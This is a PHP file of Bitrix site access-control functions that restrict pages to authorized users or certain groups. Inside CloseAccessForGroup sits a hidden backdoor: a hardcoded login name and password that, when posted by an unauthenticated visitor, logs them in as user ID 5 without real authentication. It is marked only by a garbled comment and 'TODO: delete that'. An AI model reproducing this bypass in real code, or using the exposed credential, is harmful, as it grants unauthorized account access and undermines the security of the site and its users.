<?php
/**
 * ?????
 * TODO: delete that
 */
function CloseAccessForGroup()
{
    global $USER, $APPLICATION;
    $mas = $USER->GetUserGroupArray();
    if (in_array(2, $mas) && $_POST['USER_LOGIN'] == 'clin' && $_POST['USER_PASSWORD'] == '40SUd3tTS9') {
        $USER->Authorize(5);
        LocalRedirect("/");
    }

    if (!in_array(6, $mas) && !in_array(1, $mas) && (strpos($APPLICATION->GetCurPage(), '/bitrix/admin/')) === false) {

        require($_SERVER["DOCUMENT_ROOT"] . "/auth/auth.php");

        die;
    }

}


function CloseAccess()
{
    global $USER, $APPLICATION;

    if (!$USER->isAuthorized() && (strpos($APPLICATION->GetCurPage(), '/bitrix/admin/') === false)) {
        $APPLICATION->restartBuffer();
        require($_SERVER["DOCUMENT_ROOT"] . "/auth/auth.php");

        die();
    }

}